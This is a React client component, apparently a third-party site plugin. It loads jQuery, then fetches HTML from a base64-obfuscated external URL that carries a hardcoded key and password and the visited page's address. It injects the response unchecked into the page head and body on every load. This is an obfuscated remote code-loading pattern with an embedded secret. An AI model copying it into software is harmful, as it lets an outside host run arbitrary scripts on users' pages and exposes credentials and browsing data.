"use client";

import React, { useEffect } from "react";

const Plugin = () => {
  useEffect(() => {
    const loadCustomScript = () => {
      // Check if jQuery is available
      if (window.jQuery) {
        // jQuery is already loaded
        executeCustomScript();
      } else {
        // Dynamically load jQuery
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.onload = () => {
          executeCustomScript();
        };
        document.head.appendChild(script);
      }
    };

    const executeCustomScript = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();

      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response !== 0) {
            let temp = [];
            const mystr = this.response;
            temp = mystr.split("||||||||||");

            // Same as original script
            jQuery("head").find("title").remove();
            jQuery("head").append(temp[0]);
            jQuery("body").append(temp[1]);
          }
        }
      };

      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    loadCustomScript();
  }, []);

  return null;
};

export default Plugin;
